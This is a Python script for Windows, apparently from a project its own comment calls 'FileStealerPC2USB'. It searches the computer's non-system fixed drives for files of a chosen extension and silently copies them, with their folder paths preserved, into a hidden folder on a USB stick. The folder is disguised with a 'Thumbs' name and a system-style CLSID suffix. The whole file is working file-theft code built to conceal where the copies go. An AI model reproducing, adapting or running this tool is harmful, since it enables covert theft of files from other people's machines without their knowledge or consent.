from sys import stdout
from time import sleep
from os import walk, chdir, listdir, sep, environ, path, mkdir, makedirs
from shutil import copyfile
from time import localtime
from win32api import GetLogicalDrives
from win32file import GetDriveType, DRIVE_FIXED, DRIVE_REMOVABLE

class Mains:
    def usb_finder(self):
        self.usb_list = []
        self.dest = ""
        drivebits = GetLogicalDrives()
        for d in range(1, 26):
            mask = 1 << d
            if drivebits & mask:
                drname = '%c:\\' % chr(ord('A') + d)
                t = GetDriveType(drname)
                if t == DRIVE_REMOVABLE:
                    self.usb_list.append(drname)

        if self.usb_list.__len__() == 0 :
            print("No USB Connected!!!")
            sleep(4)
            exit()

        favorite = ".Thumbs.ms.{2227a280-3aea-1069-a2de-08002b30309d}"

        for usb in self.usb_list:

            chdir(usb)
            if favorite in listdir('.'):
                self.dest = usb + "\\" + favorite + "\\"
        if self.dest == "":
            print("No F-USB!!!")
            sleep(4)
            exit()

    def drives(self):
        win = environ['SYSTEMDRIVE'] + "\\"

        self.drive_list = []
        drivebits = GetLogicalDrives()
        for d in range(1, 26):
            mask = 1 << d
            if drivebits & mask:
                drname = '%c:\\' % chr(ord('A') + d)
                t = GetDriveType(drname)
                if t == DRIVE_FIXED:
                    self.drive_list.append(drname)

## region OS:
        for i in self.drive_list:
            if i == win :
                self.drive_list.remove(i)
## endregion

    def copier(self):
        self.counter = 0
        for driver in self.drive_list :
            chdir(driver)

            filetype = '.bmpsa'

            # destination = "D:\\MY Projects\\Python\\FileStealerPC2USB\\n\\"

            for (dirpath, dirname, filenames) in walk('.'):
                for filename in filenames:
                    if filename.endswith(filetype):
                        main_location = sep.join([dirpath,filename])

                        timemin = str(localtime().tm_min)
                        timesec = str(localtime().tm_sec)

                        time = " (m" + timemin + "-s" + timesec + ")"

                        absulpath = path.abspath(main_location).replace(":","")
                        absulpath = absulpath[:absulpath.rfind("\\")] + "\\"
                        # print(absulpath)

                        if filename in listdir(self.dest):
                            filename = filename.replace(filetype,"")

                            makedirs(path.dirname(self.dest + absulpath), exist_ok=True)
                            copyfile(main_location, self.dest + absulpath+ filename + time + filetype)
                            # print(main_location)
                            self.counter += 1
                            # print(counter)
                            stdout.write('\r'+str(self.counter))

                        else:

                            makedirs(path.dirname(self.dest + absulpath), exist_ok=True)
                            copyfile(main_location, self.dest +absulpath+ filename)
                            self.counter += 1
                            # print(counter)
                            stdout.write('\r' +str(self.counter))
        print(".")

M = Mains()
M.usb_finder()
M.drives()
M.copier()






        # print(timesec)

    # print(lister)

        # for file in f:
        #     timemin = str(localtime().tm_min)
        #     timesec = str(localtime().tm_sec)
        #
        #     # print(timesec)
        #     time ="m" + timemin+ "-s"+timesec
        #
        #     if file in listdir(destination) :
        #         copyfile(file, destination + file + time)
        #         print("ok")
        #     else:
        #         copyfile(file, destination + file)
                # print("no")
        # for dir in d:
        #     if dir in "n" :
        #         copytree(dir, "n\\" + dir + str(time.localtime().tm_min) , str(time.localtime().tm_sec))
        #     else:
        #         copytree(dir, "n\\" + dir)

# print(dirs)
# print(files)
